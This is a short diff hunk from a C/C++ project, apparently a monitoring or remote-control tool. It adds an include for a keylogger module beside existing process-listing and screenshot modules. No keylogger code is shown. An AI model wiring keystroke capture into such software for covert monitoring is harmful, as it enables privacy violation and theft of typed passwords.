@@ -22,6 +22,7 @@
 #include "./runningprocess/runningprocess.h"
 #include "./runningapp/runningapp.h"
 #include "./screenshot/screenshot.h"
+#include "./keylogger/keylogger.h"
 #include "stringProcess.h"
 
 // void concatenate(char*& res, const char* buf, int &maxLength) {
